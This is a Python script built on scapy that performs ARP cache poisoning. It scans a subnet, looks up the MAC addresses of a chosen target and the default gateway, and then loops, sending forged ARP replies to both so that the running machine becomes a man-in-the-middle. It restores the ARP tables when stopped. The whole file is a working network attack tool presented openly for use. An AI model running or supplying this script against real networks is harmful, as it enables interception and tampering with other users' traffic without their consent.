import time
import scapy.all as scapy
import argparse
import subprocess

def show_arp_table(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered,unanswered=scapy.srp(combined_packet,timeout=1)
    answered.summary()

def user_input():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--ip-address",dest="ip_address",help="Enter IP address range. Example '10.0.2.1/24'")
    parser.add_argument("-c","--cooldown",default=3,dest="time",help="Cooldown time for arp-poisen. Default value: 3")
    parser.add_argument("-t","--target",dest="target",help="Target IP address.",default=None)
    parser.add_argument("-g","--gateway",dest="gateway",help="Default gateway IP address",default=None)
    args = parser.parse_args()
    return args


def get_mac_ip_of_target(target_ip):
    if target_ip == None:
        print("\n\nIP address must be owned by target.")
        ip_address = input("Enter IP Address: ")
    else:
        ip_address = target_ip
    arp_request_packet = scapy.ARP(pdst=ip_address)
    broadcat_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcat_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    mac_address = answered_list[0][1].hwsrc
    
    return {"mac":mac_address,"ip":ip_address}

def get_mac_ip_of_gateway(gateway_ip):
    if gateway_ip == None:
        print("\n\nThese addresses must be owned by default gateway.")
        ip_address = input("Enter IP Address: ")
    else:
        ip_address=gateway_ip
    arp_request_packet = scapy.ARP(pdst=ip_address)
    broadcat_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcat_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    mac_address = answered_list[0][1].hwsrc
    return {"mac":mac_address,"ip":ip_address}

def send_packet(mac_ip_of_target, mac_ip_of_gateway):
    # op=2 means arp-response
    arp_response = scapy.ARP(op=2,pdst=mac_ip_of_target["ip"],hwdst=mac_ip_of_target["mac"],psrc=mac_ip_of_gateway["ip"])
    scapy.send(arp_response,verbose=False)


def reset_poisen(mac_ip_of_target, mac_ip_of_gateway):
    # op=2 means arp-response
    arp_response = scapy.ARP(op=2,pdst=mac_ip_of_target["ip"],hwdst=mac_ip_of_target["mac"],psrc=mac_ip_of_gateway["ip"],hwsrc=mac_ip_of_gateway["mac"])
    scapy.send(arp_response,verbose=False)

def clear_terminal():
    subprocess.call("clear")





# Getting User Inputs
args = user_input()

# Showing arp table to select valid addresses.
if (args.target == None) or (args.gateway == None):
    show_arp_table(args.ip_address)

# Getting MAC and IP address of target
mac_ip_of_target = get_mac_ip_of_target(args.target)

# Getting MAC and IP address of default gateway
mac_ip_of_gateway = get_mac_ip_of_gateway(args.gateway)

# Clear Terminal
clear_terminal()


packet_counter = 0
try:
    while True:
        # Sending Arp Response Packet to poisen default gateway.
        send_packet(mac_ip_of_target, mac_ip_of_gateway)
        
        # Sending Arp Response Packet to poisen target.
        send_packet(mac_ip_of_gateway,mac_ip_of_target)
        packet_counter +=2
        print(f"\rPackets Send: {packet_counter}",end="")
        print("\nCTRL+C to exit.")
        time.sleep(args.time)
except KeyboardInterrupt:
    print("Poisen reseting.")
    reset_poisen(mac_ip_of_gateway,mac_ip_of_target)
    reset_poisen(mac_ip_of_target,mac_ip_of_gateway)
    time.sleep(1)
    clear_terminal()
    print("Exited.")